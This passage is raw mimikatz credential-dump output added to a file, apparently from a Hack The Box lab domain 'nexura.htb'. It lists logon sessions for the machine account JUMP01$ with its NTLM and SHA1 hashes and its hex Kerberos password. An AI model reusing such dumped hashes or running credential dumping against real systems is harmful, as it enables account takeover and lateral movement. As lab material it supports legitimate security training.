+         * Password : d7 9f 44 db 12 9f ab 43 69 44 98 db 07 7d cd f3 13 1b 1b b4 30 45 91 04 d6 27 c4 c1 a6 4f 30 74 c4 ab e4 ff c8 b0 a8 79 9e 7f a9 31 99 a5 9a 81 23 de 43 49 8d 27 46 92 8e e0 63 8c e8 53 bc a3 d5 d3 cf 46 58 c5 2b 80 00 08 dc 36 8b ed 73 7d 75 e9 7f 3f a7 1f 1c b8 44 6e b4 17 d9 12 5b 4f 20 62 79 7d b4 e0 08 78 7f 51 6f 6d 94 b7 9d bb 29 49 41 8b f5 90 f0 f9 3f 30 63 2d 92 09 b2 dc ff 4d 84 5a ec 1d 45 be fc eb c0 93 a7 aa 84 06 dc e3 58 b2 0a 78 ce 37 48 a0 89 aa ba 9b 0e f4 58 1d 1e e1 45 9b 69 cb 12 7e 72 77 80 d6 3d 3e b2 be 55 d5 a6 d1 09 c3 ff 86 1b b3 87 d4 60 58 52 8d 70 dc 48 ef 97 5f 81 56 a0 90 e4 b3 7c dc c7 90 68 06 21 e9 c7 fb 90 50 59 fc eb 0e 45 45 0f 0b 15 d6 6b 2d 11 26 e6 0f d4 d3 1f 9b 7a 0f
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 39843 (00000000:00009ba3)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/19/2026 6:44:51 PM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * NTLM     : 47b03bb57dee903b136f1e60605a4b2c
+         * SHA1     : dcdb18e76f120f0683b267fcc2b6b9d6c759798c
+        tspkg :
+        wdigest :
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * Password : (null)
+        kerberos :
+         * Username : JUMP01$
+         * Domain   : nexura.htb
+         * Password : d7 9f 44 db 12 9f ab 43 69 44 98 db 07 7d cd f3 13 1b 1b b4 30 45 91 04 d6 27 c4 c1 a6 4f 30 74 c4 ab e4 ff c8 b0 a8 79 9e 7f a9 31 99 a5 9a 81 23 de 43 49 8d 27 46 92 8e e0 63 8c e8 53 bc a3 d5 d3 cf 46 58 c5 2b 80 00 08 dc 36 8b ed 73 7d 75 e9 7f 3f a7 1f 1c b8 44 6e b4 17 d9 12 5b 4f 20 62 79 7d b4 e0 08 78 7f 51 6f 6d 94 b7 9d bb 29 49 41 8b f5 90 f0 f9 3f 30 63 2d 92 09 b2 dc ff 4d 84 5a ec 1d 45 be fc eb c0 93 a7 aa 84 06 dc e3 58 b2 0a 78 ce 37 48 a0 89 aa ba 9b 0e f4 58 1d 1e e1 45 9b 69 cb 12 7e 72 77 80 d6 3d 3e b2 be 55 d5 a6 d1 09 c3 ff 86 1b b3 87 d4 60 58 52 8d 70 dc 48 ef 97 5f 81 56 a0 90 e4 b3 7c dc c7 90 68 06 21 e9 c7 fb 90 50 59 fc eb 0e 45 45 0f 0b 15 d6 6b 2d 11 26 e6 0f d4 d3 1f 9b 7a 0f
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 38614 (00000000:000096d6)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 4/19/2026 6:44:51 PM
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * NTLM     : 47b03bb57dee903b136f1e60605a4b2c
+         * SHA1     : dcdb18e76f120f0683b267fcc2b6b9d6c759798c
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : JUMP01$
+Domain            : NEXURA
+Logon Server      : (null)
+Logon Time        : 4/19/2026 6:44:51 PM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * Password : (null)
+        kerberos :
+         * Username : jump01$
+         * Domain   : NEXURA.HTB
+         * Password : d7 9f 44 db 12 9f ab 43 69 44 98 db 07 7d cd f3 13 1b 1b b4 30 45 91 04 d6 27 c4 c1 a6 4f 30 74 c4 ab e4 ff c8 b0 a8 79 9e 7f a9 31 99 a5 9a 81 23 de 43 49 8d 27 46 92 8e e0 63 8c e8 53 bc a3 d5 d3 cf 46 58 c5 2b 80 00 08 dc 36 8b ed 73 7d 75 e9 7f 3f a7 1f 1c b8 44 6e b4 17 d9 12 5b 4f 20 62 79 7d b4 e0 08 78 7f 51 6f 6d 94 b7 9d bb 29 49 41 8b f5 90 f0 f9 3f 30 63 2d 92 09 b2 dc ff 4d 84 5a ec 1d 45 be fc eb c0 93 a7 aa 84 06 dc e3 58 b2 0a 78 ce 37 48 a0 89 aa ba 9b 0e f4 58 1d 1e e1 45 9b 69 cb 12 7e 72 77 80 d6 3d 3e b2 be 55 d5 a6 d1 09 c3 ff 86 1b b3 87 d4 60 58 52 8d 70 dc 48 ef 97 5f 81 56 a0 90 e4 b3 7c dc c7 90 68 06 21 e9 c7 fb 90 50 59 fc eb 0e 45 45 0f 0b 15 d6 6b 2d 11 26 e6 0f d4 d3 1f 9b 7a 0f
+        ssp :
+        credman :
+
+mimikatz #
